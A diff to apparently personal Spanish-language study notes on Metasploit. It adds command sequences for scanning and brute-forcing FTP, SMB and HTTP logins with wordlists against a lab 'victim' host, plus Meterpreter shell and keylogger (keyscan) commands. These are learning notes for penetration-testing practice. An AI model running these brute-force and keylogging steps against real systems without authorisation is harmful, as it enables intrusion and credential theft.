@@ -5,10 +5,12 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 ## Comandos Meterpreter 
 
 ```bash 
-❯ sysinfo                 # Muestra informacion general de la maquina victima, name, OS, Kernel, etc... 
-❯ shell                   # Nos carga una shell
-	❯ /bin/bash -i       # Si no nos crea la Shell con el comando anterior, lo hacemos con este 
-
+❯ sysinfo                    # Muestra informacion general de la maquina victima, name, OS, Kernel, etc... 
+❯ shell                      # Nos carga una shell
+	❯ /bin/bash -i          # Si no nos crea la Shell con el comando anterior, lo hacemos con este 
+❯ background                 # Ponemos la sesion en segundo plano
+❯ sessions                   # Miramos las sesiones activas en segundo plano 
+❯ sessions <id>              # Migras a alguna sesion que tenemos en segundo plano
 ```
 
 ## Port Scan
@@ -16,7 +18,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 * **Auxiliary Madules:** Son usados para  ejecutar funcionalidades como escanear, descubrir y fuzzear. Podemos usar los módulos auxiliares para ejecutar escaneo de puertos tanto TCP como UDP, así como enumerar información de los servicios como FTP, SSH, HTTP, etc... También, podemos utilizar los módulos auxiliares para descubrir hosts y ejecutar escaneo de puertos en una diferente red o subred desde de obtener el acceso inicial en un sistema target. 
 
 ```bash 
-# Escaneo de puertos a una sola direccion IP
+# Escaneo de puertos a una sola direccion IP por TCP
 ❯ msfconsole -q                  # q = Quitar el banner de inicio
 
 	❯ search portscan                             
@@ -37,6 +39,58 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ set RHOSTS 192.168.1.194                       # Colocamos la IP de la maquina victima
 	❯ set TARGETURI /
 	❯ exploit                                        
+```
+
+```bash 
+# Escaneo de puertos a una sola direccion IP por UDP
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ search portscan                             
+	❯ use auxiliary/scanner/discovery/upd_sweep          # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                           # Colocamos la IP de la maquina victima
+	❯ run 
+```
+
+## Puerto 21 FTP 
+
+```bash 
+# Mirar la version del protocolo FTP
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ search portscan                             
+	❯ use auxiliary/scanner/ftp/ftp_version           # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                        # Colocamos la IP de la maquina victima
+	❯ run 
+```
+
+```bash 
+# Escaneo de autenticacion FTP
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ search portscan                             
+	❯ use auxiliary/scanner/ftp/ftp_login           # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                      # Colocamos la IP de la maquina victima
+	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt       # Agregamos la lista de usuarios 
+	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt     # Agregamos la lista de passwds 
+	❯ run 
+
+	❯ ftp <IP>         # Una vez encontrado el usuario:passwd podemos ingresar al servicio FTP desde MSF
+```
+
+```bash 
+# Mirar si al servidor FTP tiene sesion 'Anonymous' 
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ search portscan                             
+	❯ use auxiliary/scanner/ftp/anonymous           # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                      # Colocamos la IP de la maquina victima
+	❯ run  
+
+	❯ ftp <IP>                                      # Podemos ingresar como anonimo desde MSF
 ```
 
 ## Puerto 445 SMB 
@@ -94,7 +148,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ set VERBOSE false
 	❯ run 
 
-	❯ set smbuser <user>                                # si ya tenemos a un usuario enumerado lo podemos colocar con ese comando
+	❯ set SMBUser <user>                                # si ya tenemos a un usuario enumerado lo podemos colocar con ese comando
 
 # Diccionarios 
 /usr/share/wordlists/metasploit/unix_passwords.txt
@@ -111,6 +165,98 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ set smbuser <admin>
 	❯ set smbpass <passwd>
 	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ run 
+```
+
+## Puerto 80 HTTP
+
+```bash 
+# Miramos la version del HTTP
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/http/http_version      # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ run 
+```
+
+```bash 
+# Miramos la cabecera del HTTP
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/http/http_header      # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ run 
+```
+
+```bash 
+# Enumeracion de robots 'bot', donde nos muestra algunos directorios 
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/http/robots_txt        # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ run 
+```
+
+```bash 
+# Brute Force a los Dir desde la raiz
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/http/dir_scanner        # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                      # Colocamos la IP de la maquina victima
+	❯ run 
+```
+
+```bash 
+# Escaner de archivos en el HTTP desde la raiz, como: php, txt, etc...
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/http/files_dir         # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ run 
+```
+
+```bash 
+# Enumeracion de directorios
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/http/brute_dirs        # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ run 
+```
+
+```bash 
+# Enumerar usuarios y passwds con un diccionario de Fuerza Bruta
+❯ msfconsole -q                                               # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/http/http_login                    # Usamos el auxiliar
+	❯ options
+	❯ set AUTH_URI /secure/                                  # Directorio donde nos autenticamos
+	❯ unset USERPASS_FILE                                    # Quitas la ruta  
+	❯ set RHOSTS 192.168.1.194                               # Colocamos la IP de la maquina victima
+	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt
+	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+	❯ set VERBOSE false
+	❯ run 
+
+
+	❯ set USER_FILE /root/file.txt                            # Si ya tenemos al usuario lo agregamos en un archivo .txt 
+	❯ set VERBOSE true                                        
+```
+
+```bash 
+# Enumeracion de Apache a los usuarios con Fuerza Bruta
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/http/apache_userdir_enum        # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
 	❯ run 
 ```
 
@@ -138,39 +284,6 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ set STOP_ON_SUCCESS true
 	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
 	❯ set verbose true
-	❯ run 
-```
-
-
-## Puerto 80 HTTP
-
-```bash 
-# Miramos la version del HTTP
-❯ msfconsole -q                  # q = Quitar el banner de inicio
-
-	❯ use auxiliary/scanner/http/http_version      # Usamos el auxiliar 
-	❯ options
-	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
-	❯ run 
-```
-
-```bash 
-# Enumeracion de directorios
-❯ msfconsole -q                  # q = Quitar el banner de inicio
-
-	❯ use auxiliary/scanner/http/brute_dirs        # Usamos el auxiliar 
-	❯ options
-	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
-	❯ exploit 
-```
-
-```bash 
-# Enumeracion de robots 'bot'
-❯ msfconsole -q                  # q = Quitar el banner de inicio
-
-	❯ use auxiliary/scanner/http/robots_txt        # Usamos el auxiliar 
-	❯ options
-	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
 	❯ run 
 ```
 
@@ -366,7 +479,6 @@ Dentro de la maquina podemos hacer algunos comandos específicos
 ❯ keyscan_start              # Sniffer de pulsaciones del teclado
 ❯ keyscan_dump               # Nos muestra lo que capturo por el teclado con el comando anterior
 ❯ keyscan_stop               # Para el sniffer de pulsaciones del teclado
-❯ background                 # Ponemos la sesion en segundo plano 
-❯ sessions                   # Miramos las sesiones activas en segundo plano 
-❯ sessions <id>              # Migras a alguna sesion que tenemos en segundo plano
+
+
 ```
